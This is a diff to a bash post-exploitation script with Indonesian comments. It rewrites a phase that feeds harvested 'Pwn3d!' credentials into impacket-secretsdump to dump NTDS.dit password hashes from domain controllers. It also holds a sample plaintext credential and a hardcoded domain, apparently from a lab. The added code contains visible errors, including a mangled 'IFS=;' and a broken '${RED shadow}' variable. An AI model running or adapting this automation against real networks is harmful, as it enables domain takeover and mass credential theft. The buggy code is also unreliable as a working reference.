@@ -472,53 +472,46 @@ if [[ -s "$FINAL_OUT" ]]; then
         echo -e "${GRAY}------------------------------------------------------------${NC}"
     fi
 fi
-# =================================================================
-# AUTOMATIC NTDS DUMPING VIA SECRETSDUMP
-# =================================================================
-if [[ -s "$FINAL_CREDS_FILE" ]]; then
-    echo -e "\n${PURPLE}====================================================${NC}"
-    echo -e "${GREEN}[+] PHASE 5: AUTOMATIC NTDS DUMPING (SECRETSDUMP)${NC}"
-    echo -e "${PURPLE}====================================================${NC}"
-
-    while IFS=';' read -r cred_ip cred_user_pass || [[ -n "$cred_ip" ]]; do
-        [[ -z "$cred_ip" ]] && continue
-
-        # Memisahkan username dan password dari format user:pass
-        cred_user="${cred_user_pass%%:*}"
-        cred_pass="${cred_user_pass#*:}"
-
-        # Mendapatkan domain terkait berdasarkan IP target menggunakan cache/fungsi yang sudah ada
-        local_domain=$(get_domain "$cred_ip")
-
-        # Jika domain tidak ditemukan atau bernilai ".", gunakan domain default dari environment Anda
-        if [[ -z "$local_domain" || "$local_domain" == "." ]]; then
-            local_domain="DRY.MARTINI.BARS" 
-        fi
-
+#====================================================
+# PHASE 5: AUTOMATIC NTDS DUMPING (Secretsdump)
+#====================================================
+# Pastikan file kredensial ada dan berisi data sebelum dilanjutkan
+if [[ -s "$OUTDIR/final_valid_creds_all.txt" ]]; then
+    
+    # Ambil baris yang memiliki status pwn3d atau sukses
+    grep -i "Pwn3d!" "$OUTDIR/final_valid_creds_all.txt" | sort -u | while IFS=; read -r cred_line; do
+        
+        # Ekstraksi IP, User, dan Pass dari format simpanan Anda
+        # Misal format: 10.0.16.179;ATHENA_SVC:1dirtymartini
+        cred_ip=$(echo "$cred_line" | cut -d';' -f1)
+        user_pass=$(echo "$cred_line" | cut -d';' -f2)
+        cred_user=$(echo "$user_pass" | cut -d':' -f1)
+        cred_pass=$(echo "$user_pass" | cut -d':' -f2)
+        
         echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $cred_ip using $cred_user...${NC}"
         
-        # Lokasi file output untuk hasil dump
-        local dump_out_name="$OUTDIR/secretsdump_${local_domain}_${cred_ip}_${cred_user}"
+        # PERBAIKAN LOGIKA: Definisikan domain secara statis/dinamis dari mapping yang valid
+        local_domain="DRY.MARTINI.BARS" 
         
-        # Cetak perintah yang akan dijalankan
+        # PERBAIKAN SINTAKS: Hapus kata 'local' karena ini di luar fungsi!
+        dump_out_name="$OUTDIR/secretsdump_${local_domain}_${cred_ip}_${cred_user}"
+        
         echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$local_domain/$cred_user:$cred_pass@$cred_ip\" -outputfile \"$dump_out_name\"${NC}"
         
-        # Eksekusi impacket-secretsdump
-        timeout 120s impacket-secretsdump -just-dc "$local_domain/$cred_user:$cred_pass@$cred_ip" -outputfile "$dump_out_name" > "${dump_out_name}_raw.log" 2>&1
+        # Eksekusi perintah secretsdump
+        timeout 120s impacket-secretsdump -just-dc "$local_domain/$cred_user:$cred_pass@$cred_ip" -outputfile "$dump_out_name" > "$OUTDIR/secretsdump_run.log" 2>&1
         
-        # Pengecekan apakah dump berhasil
-        if grep -qiE "dumping|extracted|hashes" "${dump_out_name}_raw.log"; then
+        # Validasi output apakah berhasil terbuat
+        if [[ -s "${dump_out_name}.ntds" ]]; then
             echo -e "${GREEN}[+++] SUCCESS! Domain hashes dumped successfully from $cred_ip${NC}"
             echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
         else
-            echo -e "${RED}[-] Failed to dump NTDS from $cred_ip using credentials of $cred_user${NC}"
-            # Opsional: hapus log mentah jika gagal dan tidak diperlukan
-            rm -f "${dump_out_name}_raw.log"
+            echo -e "${RED shadow}[-] Failed to dump NTDS from $cred_ip using $cred_user (Check privileges)${NC}"
         fi
-        echo -e "${GRAY}------------------------------------------------------------${NC}"
-
-    done < "$FINAL_CREDS_FILE"
+        echo "------------------------------------------------------------"
+    done
 fi
+
 
 if [[ -s "$BROKEN_PIPE_LOG" ]]; then
     echo -e "\n${RED}[!] HOSTS WITH CONNECTION TIMEOUTS / BROKEN PIPE:${NC}"
